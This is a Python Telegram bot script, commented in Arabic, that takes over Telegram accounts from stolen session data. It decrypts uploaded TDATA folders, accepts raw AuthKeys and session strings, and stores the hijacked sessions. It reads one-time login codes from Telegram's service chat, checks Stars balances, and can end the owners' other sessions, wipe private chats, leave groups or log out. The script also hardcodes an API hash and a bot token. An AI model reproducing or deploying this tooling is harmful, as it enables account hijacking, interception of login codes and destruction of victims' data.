import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging

# =========================================================
# 🚨 رادار الأخطاء (كاشف الأعطال الصامتة لمنع توقف البوت)
# =========================================================

logging.basicConfig(
    level=logging.INFO, 
    format="%(asctime)s [%(levelname)s] %(message)s", 
    handlers=[logging.StreamHandler(sys.stdout)]
)

def radar_exception_handler(exctype, value, tb): 
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم اكتشاف خطأ، تم تجاوزه لضمان بقاء البوت!")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

sys.excepthook = radar_exception_handler

try: 
    asyncio.get_event_loop() 
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import telebot 
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton 
from pyrogram import Client 
from pyrogram.enums import ChatType 
from pyrogram.errors import FloodWait, AuthKeyUnregistered, SessionRevoked 
from telethon.sessions import StringSession 
from telethon.crypto import AuthKey

# المكتبة المتخصصة لفك تشفير TDATA
try: 
    from opentele.td import TDesktop 
    OPENTELE_AVAILABLE = True 
except ImportError: 
    OPENTELE_AVAILABLE = False 
    logging.warning("⚠️ مكتبة 'opentele' غير مثبتة! يرجى كتابة: pip install opentele") 
except BaseException as e:
    OPENTELE_AVAILABLE = False 
    logging.warning(f"⚠️ خطأ في تحميل مكتبة opentele: {e}")

# --- المتغيرات الأساسية ---
API_ID = 28797361
API_HASH = "771041b32e83ab232e066b7adeee700b"
BOT_TOKEN = "8960187108:AAGevNJ_kOtfCkvnY0rpZ3VtUZPqFfmSrr8"

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=10) 

# =========================================================
# 🗄️ إدارة قواعد البيانات
# =========================================================

def get_db_conn(): 
    return sqlite3.connect('accounts.db', check_same_thread=False, timeout=20)

def init_db(): 
    conn = get_db_conn() 
    c = conn.cursor() 
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, stars INTEGER)''') 
    conn.commit() 
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars): 
    conn = get_db_conn() 
    c = conn.cursor() 
    c.execute("INSERT INTO sessions (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars))
    conn.commit() 
    conn.close()

def get_all_accounts(owner_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, stars FROM sessions WHERE owner_id=?", (owner_id,)) 
    rows = c.fetchall() 
    conn.close() 
    return rows

def get_account(acc_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id=?", (acc_id,)) 
    row = c.fetchone()
    conn.close() 
    return row

def delete_account(acc_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,)) 
    conn.commit()
    conn.close()

init_db()

# --- دوال الأعلام والبلدان ---
COUNTRY_FLAGS = {
    "+58": ("🇻🇪", "Venezuela"), "+964": ("🇮🇶", "العراق"), "+966": ("🇸🇦", "السعودية"), 
    "+971": ("🇦🇪", "الإمارات"), "+965": ("🇰🇼", "الكويت"), "+974": ("🇶🇦", "قطر"), 
    "+973": ("🇧🇭", "البحرين"), "+968": ("🇴🇲", "عُمان"), "+20": ("🇪🇬", "مصر"), 
    "+212": ("🇲🇦", "المغرب"), "+213": ("🇩🇿", "الجزائر"), "+216": ("🇹🇳", "تونس"), 
    "+218": ("🇱🇾", "ليبيا"), "+249": ("🇸🇩", "السودان"), "+967": ("🇾🇪", "اليمن"), 
    "+962": ("🇯🇴", "الأردن"), "+961": ("🇱🇧", "لبنان"), "+963": ("🇸🇾", "سوريا"),
    "+1": ("🇺🇸", "USA/Canada"), "+44": ("🇬🇧", "UK"), "+62": ("🇮🇩", "Indonesia")
}

def get_country_info(phone): 
    if not phone: return "🏳️", "Unknown" 
    if not phone.startswith("+"): phone = "+" + phone
    for prefix, (flag, name) in COUNTRY_FLAGS.items(): 
        if phone.startswith(prefix): return flag, name 
    return "🏳️", "Unknown"

# --- واجهات التحكم بالبوت ---
def home_keyboard(): 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("إنهاء الجلسات الأخرى ☠️", callback_data="menu_terminate"), InlineKeyboardButton("جلب الكود ✉️", callback_data="req_code"))
    markup.row(InlineKeyboardButton("تنظيف الحساب (شامل) 🧹", callback_data="menu_clean")) 
    markup.row(InlineKeyboardButton("تسجيل خروج 🚪", callback_data="menu_logout")) 
    markup.row(InlineKeyboardButton("كشف الحسابات 🕵️", callback_data="reveal_accounts")) 
    return markup

def accounts_action_keyboard(owner_id, action): 
    accounts = get_all_accounts(owner_id) 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 الجميع", callback_data=f"act_{action}_all"))
    for acc_id, phone, name, stars in accounts:
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"act_{action}_{acc_id}")) 
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")) 
    return markup

# --- الأوامر والردود ---
@bot.message_handler(commands=['start']) 
def start_message(message):
    bot.reply_to(
        message, 
        "🤖 **أهلاً بك في بوت الإدارة الاحترافي!**\n\n"
        "• أرسل **ملف TDATA (بصيغة ZIP)** ليتم سحب الحساب.\n"
        "• أرسل **مفتاح AuthKey (HEX)** مع السيرفر أو بدونه.\n"
        "• أو أرسل **مفتاح الجلسة (نص Session)** مباشرة للاتصال به.\n"
        "• تحكم بحساباتك بالكامل عبر الأزرار بالأسفل.", 
        reply_markup=home_keyboard(), 
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "back_home") 
def back_home(call): 
    bot.edit_message_text("🤖 **القائمة الرئيسية:**", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
def reveal_accounts(call): 
    accounts = get_all_accounts(call.from_user.id) 
    if not accounts: 
        return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True) 
    
    text = "🕵️ **قائمة الحسابات المتوفرة:**\n\n" 
    for acc_id, phone, name, stars in accounts: 
        text += f"▪️ **الرقم:** `{phone}`\n▪️ **الاسم:** {name}\n▪️ **النجوم:** {stars}\n〰️〰️〰️〰️〰️〰️〰️〰️\n" 
    
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")) 
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

# =========================================================
# 🔄 محرك جلب الأكواد الذكي 
# =========================================================

@bot.callback_query_handler(func=lambda call: call.data == "req_code") 
def scan_all_codes(call): 
    bot.answer_callback_query(call.id, "⏳ جاري جلب الأكواد للحسابات...") 
    status_msg = bot.send_message(call.message.chat.id, "⏳ جاري فحص الحسابات للبحث عن أكواد الدخول الجديدة...", parse_mode="Markdown")
    asyncio.run(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def fetch_all_codes_async(owner_id, chat_id, msg_id): 
    accounts = get_all_accounts(owner_id) 
    if not accounts: 
        bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard())
        return

    found_codes = []
    for acc in accounts:
        acc_id, phone, name, stars = acc
        target_acc = get_account(acc_id)
        if not target_acc: continue
        pyro_session = target_acc[5]

        exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await exec_client.connect()
            async for msg in exec_client.get_chat_history(777000, limit=2):
                if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                    match = re.search(r'\b(\d{5})\b', msg.text)
                    if match:
                        found_codes.append((phone, match.group(1)))
                        break  
        except: pass  
        finally:
            if exec_client.is_connected: await exec_client.disconnect()

    if found_codes:
        text = "✅ **تم جلب أكواد الدخول:**\n\n"
        for phone, code in found_codes:
            flag, country = get_country_info(phone)
            text += f"🌎 Country: {flag} {country}\n"
            text += f"📱 Service: 📱\n"
            text += f"🔢 Number: {phone}\n"
            text += f"🔑 OTP: `{code}`\n"
            text += "━━━━━━━━━━━━━━━━\n"
            
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())
    else:
        bot.edit_message_text("❌ لم يصل أي كود جديد لأي حساب حالياً.", chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())

# =========================================================
# ⚙️ قوائم التنفيذ (إنهاء، تنظيف، تسجيل خروج)
# =========================================================

@bot.callback_query_handler(func=lambda call: re.match(r"^menu_(terminate|clean|logout)$", call.data)) 
def action_menus(call):
    action = call.data.split("_")[1] 
    titles = { 
        "terminate": "💀 **إنهاء الجلسات الأخرى:**\nاختر الحساب الذي تريد إنهاء جلساته أو اختر الجميع:", 
        "clean": "🧹 **التنظيف الشامل:**\nاختر الحساب الذي تريد مسح محادثاته أو اختر الجميع:", 
        "logout": "🚪 **تسجيل الخروج:**\nاختر الحساب لتسجيل الخروج منه أو اختر الجميع:" 
    } 
    bot.edit_message_text(titles[action], call.message.chat.id, call.message.message_id, reply_markup=accounts_action_keyboard(call.from_user.id, action), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: re.match(r"^act_(terminate|clean|logout)_(all|\d+)$", call.data)) 
def execute_action(call): 
    data = call.data.split("_") 
    action, target = data[1], data[2] 
    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ، يرجى الانتظار...")
    
    status_msg = bot.send_message(call.message.chat.id, "⏳ جاري العمل على طلبك...")

    if target == "all":
        accounts = get_all_accounts(call.from_user.id)
        results = []
        for acc in accounts: 
            res = asyncio.run(perform_action_async(action, acc[0]))
            results.append(res)
            time.sleep(0.5) 
        
        final_text = "**ملخص تنفيذ العملية (الجميع):**\n\n" + "\n".join(results)
        bot.edit_message_text(final_text, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
    else:
        msg = asyncio.run(perform_action_async(action, int(target)))
        bot.edit_message_text(msg, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

async def perform_action_async(action, acc_id): 
    acc = get_account(acc_id) 
    if not acc: return "❌ الحساب غير موجود." 
    _, _, phone, user_id, first_name, pyro_session, _, _, _ = acc

    try:
        exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        await exec_client.connect()
    except (AuthKeyUnregistered, SessionRevoked):
        delete_account(acc_id)
        return f"❌ الحساب `{phone}` مسجل خروج، تم حذفه من البوت."
    except Exception as e: 
        return f"❌ فشل الاتصال بـ `{phone}`"

    result_msg = ""
    try:
        if action == "terminate":
            auths = await exec_client.get_authorizations()
            for auth in auths:
                if not auth.is_current:
                    await exec_client.terminate_session(auth.hash)
                    await asyncio.sleep(0.5)
            result_msg = f"✅ تم إنهاء جميع الجلسات الأخرى لـ `{phone}`."

        elif action == "clean":
            async for dialog in exec_client.get_dialogs():
                try:
                    if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                        await exec_client.leave_chat(dialog.chat.id)
                        await asyncio.sleep(0.3)
                    elif dialog.chat.type == ChatType.PRIVATE and not dialog.chat.is_verified:
                        await exec_client.delete_chat_history(dialog.chat.id)
                        await asyncio.sleep(0.3)
                except FloodWait as e: await asyncio.sleep(e.value)
                except: continue
            result_msg = f"🧹 تم التنظيف الشامل بنجاح لـ `{phone}`."

        elif action == "logout":
            await exec_client.log_out()
            delete_account(acc_id)
            result_msg = f"🚪 تم تسجيل الخروج بنجاح لـ `{phone}`."

    except Exception as e: 
        error_str = str(e).lower()
        if "fresh_reset_authorisation_forbidden" in error_str or "24 hours" in error_str:
            result_msg = f"⚠️ الحساب `{phone}`: يجب الانتظار 24 ساعة لإنهاء الجلسات."
        else:
            result_msg = f"❌ خطأ في الحساب `{phone}`: {type(e).__name__}"
    finally:
        if exec_client.is_connected: await exec_client.disconnect()
        
    return result_msg

# =========================================================
# 📥 محرك الـ TDATA (الجزء المتعوب عليه - لم يُلمس)
# =========================================================

def get_dc_ip(dc_id): 
    ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"} 
    return ips.get(dc_id, "149.154.167.51")

def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999): 
    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False) 
    pyro_session = base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("=")

    session = StringSession()
    session._dc_id = dc_id
    session._server_address = get_dc_ip(dc_id)
    session._port = 443  
    session._auth_key = AuthKey(auth_key_bytes)

    return pyro_session, session.save()

async def extract_tdata_official(base_dir): 
    if not OPENTELE_AVAILABLE: return None, None, None

    tdata_path = None
    for root, dirs, files in os.walk(base_dir):
        if 'key_datas' in files:
            tdata_path = root
            break

    if not tdata_path: return None, None, None

    try:
        tdesk = TDesktop(tdata_path)
        if not tdesk.isLoaded(): return None, None, None

        def get_real_auth(acc):
            auth_key = None
            if hasattr(acc, 'authKey') and acc.authKey:
                auth_key = acc.authKey.key if hasattr(acc.authKey, 'key') else acc.authKey
            elif hasattr(acc, 'api') and acc.api and hasattr(acc.api, 'auth_key'):
                auth_key = acc.api.auth_key.key if hasattr(acc.api.auth_key, 'key') else acc.api.auth_key

            dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', None)))
            if not dc_id and hasattr(acc, 'api'):
                dc_id = getattr(acc.api, 'dc_id', getattr(acc.api, 'MainDcId', None))

            user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))

            if isinstance(auth_key, bytes) and len(auth_key) == 256 and dc_id:
                return int(dc_id), auth_key, int(user_id)
            return None, None, None

        if hasattr(tdesk, 'accounts') and tdesk.accounts:
            for acc in tdesk.accounts:
                d, a, u = get_real_auth(acc)
                if d and a: return d, a, u

        if hasattr(tdesk, 'mainAccount') and tdesk.mainAccount:
            d, a, u = get_real_auth(tdesk.mainAccount)
            if d and a: return d, a, u

        return None, None, None
    except Exception as e:
        logging.error(f"Error extracting TDATA: {e}")
        return None, None, None

async def verify_and_save_async(owner_id, dc_id, auth_key, user_id, stype): 
    pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key, user_id) 
    client = Client(f"verify_{owner_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True) 

    try:
        await client.connect() 
        me = await client.get_me() 
    except AuthKeyUnregistered:
        return None, None, None, None
    except Exception as e:
        return None, None, None, None

    phone = me.phone_number or "Unknown"
    first_name = me.first_name or "User"
    uid = me.id

    try:
        from pyrogram.raw.functions.payments import GetStarsStatus
        res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
        stars = getattr(res, "balance", 0)
    except: stars = 0

    await client.disconnect()
    save_account(owner_id, phone, uid, first_name, pyro_session, tl_session, stype, stars)
    return phone, first_name, stars, uid

# =========================================================
# 📥 إضافة الحسابات عن طريق إرسال الـ Session أو AuthKey كنص
# =========================================================

@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_text_input(message):
    text = message.text.strip()
    
    # 1. فحص هل النص يحتوي على AuthKey HEX (طوله بالضبط 512 حرف من 0-9 و a-f)
    hex_match = re.search(r'\b([0-9a-fA-F]{512})\b', text)
    
    if hex_match:
        hex_key = hex_match.group(1)
        remaining_text = text.replace(hex_key, "").strip()
        
        # استخراج رقم السيرفر (DC) لو كان موجود بالرسالة
        dc_match = re.search(r'\b([1-5])\b', remaining_text)
        dcs_to_test = [int(dc_match.group(1))] if dc_match else [1, 2, 3, 4, 5]
        
        if len(dcs_to_test) > 1:
            status_msg = bot.reply_to(message, "⏳ لم يتم تحديد سيرفر، جاري فحص جميع السيرفرات (1 إلى 5)...")
        else:
            status_msg = bot.reply_to(message, f"⏳ جاري تسجيل الدخول عبر السيرفر {dcs_to_test[0]}...")

        async def verify_hex_key():
            auth_key_bytes = bytes.fromhex(hex_key)
            for dc_id in dcs_to_test:
                pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key_bytes, 9999)
                client = Client(f"hex_{message.from_user.id}_{int(time.time())}_{dc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
                try:
                    await client.connect()
                    me = await client.get_me()
                    phone = me.phone_number or "Unknown"
                    
                    stars = 0
                    try:
                        from pyrogram.raw.functions.payments import GetStarsStatus
                        res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
                        stars = getattr(res, "balance", 0)
                    except: pass
                    
                    save_account(message.from_user.id, phone, me.id, me.first_name, pyro_session, tl_session, f"Hex AuthKey", stars)
                    await client.disconnect()
                    return me
                except Exception as e:
                    if client.is_connected:
                        await client.disconnect()
                    continue # فشل في هذا السيرفر، جرب السيرفر اللي بعده
            return None

        me = asyncio.run(verify_hex_key())

    # 2. إذا لم يكن AuthKey HEX، نفحص إذا كان Session String عادي (مثل Pyrogram/Telethon)
    elif len(text) > 50 and " " not in text:
        status_msg = bot.reply_to(message, "⏳ جاري فحص مفتاح الجلسة...")
        async def verify_text_session():
            try:
                client = Client(f"txt_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=text, in_memory=True)
                await client.connect()
                me = await client.get_me()
                phone = me.phone_number or "Unknown"
                
                stars = 0
                try:
                    from pyrogram.raw.functions.payments import GetStarsStatus
                    res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
                    stars = getattr(res, "balance", 0)
                except: pass
                
                save_account(message.from_user.id, phone, me.id, me.first_name, text, "", "String Session", stars)
                await client.disconnect()
                return me
            except Exception as e:
                return None

        me = asyncio.run(verify_text_session())
    else:
        # إذا النص عادي وليس مفتاح
        return

    # 3. إرسال الكليشة الفخمة في حال نجاح إحدى الطريقتين
    if me:
        phone_clean = me.phone_number.replace("+", "") if me.phone_number else "Unknown"
        success_text = f"✅ **تم تسجيل الدخول بنجاح!**\n\n" \
                       f"👤 الاسم: {me.first_name}\n" \
                       f"📞 رقم الهاتف: {phone_clean}\n" \
                       f"🆔 الآيدي: `{me.id}`\n\n" \
                       f"استخدم الأزرار أدناه للتحكم:"
               
        bot.edit_message_text(success_text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
    else:
        bot.edit_message_text("❌ الجلسة معطوبة، أو السيرفر غير صحيح، أو الحساب مسجل خروج.", message.chat.id, status_msg.message_id)

# =========================================================
# 📥 إضافة الحسابات عن طريق إرسال ملف ZIP (TDATA) - لم يلمس!
# =========================================================

@bot.message_handler(content_types=['document']) 
def handle_files(message):
    file_name = message.document.file_name 
    if not file_name.endswith(".zip"): return

    status_msg = bot.reply_to(message, f"⏳ جاري سحب الحساب من: `{file_name}`...", parse_mode="Markdown")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    extract_dir = f"tmp_{message.from_user.id}_{message.message_id}_{int(time.time())}"
    os.makedirs(extract_dir, exist_ok=True)
    local_path = os.path.join(extract_dir, file_name)

    with open(local_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    try:
        with zipfile.ZipFile(local_path, 'r') as zip_ref: 
            zip_ref.extractall(extract_dir)

        dc_id, auth_key, user_id = asyncio.run(extract_tdata_official(extract_dir))

        if dc_id and auth_key:
            p, n, s, uid = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, user_id, "TDATA Account"))
            if p:
                phone_clean = p.replace("+", "") if p else "Unknown"
                text = f"✅ **تم تسجيل الدخول بنجاح!**\n\n" \
                       f"👤 الاسم: {n}\n" \
                       f"📞 رقم الهاتف: {phone_clean}\n" \
                       f"🆔 الآيدي: `{uid}`\n\n" \
                       f"استخدم الأزرار أدناه للتحكم:"
                bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
            else:
                bot.edit_message_text("❌ الجلسة معطوبة أو تم تسجيل الخروج منها مسبقاً.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
        else:
            bot.edit_message_text("❌ لم يتم العثور على ملفات حساب TDATA صالحة داخل هذا الـ ZIP.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
            
    except zipfile.BadZipFile:
        bot.edit_message_text("❌ الملف المرسل ليس ملف ZIP صالحاً.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
    except Exception as e:
        bot.edit_message_text(f"❌ حدث خطأ غير متوقع", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
    finally:
        shutil.rmtree(extract_dir, ignore_errors=True)

# =========================================================
# 🚀 تشغيل البوت المباشر القوي
# =========================================================

if __name__ == "__main__": 
    logging.info("🚀 جاري إطلاق البوت...")
    try: 
        bot.remove_webhook() 
        time.sleep(1) 
    except: pass

    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=15)
        except Exception as e:
            logging.error(f"⚠️ انقطع الاتصال .. إعادة التشغيل التلقائي بعد 3 ثواني")
            time.sleep(3)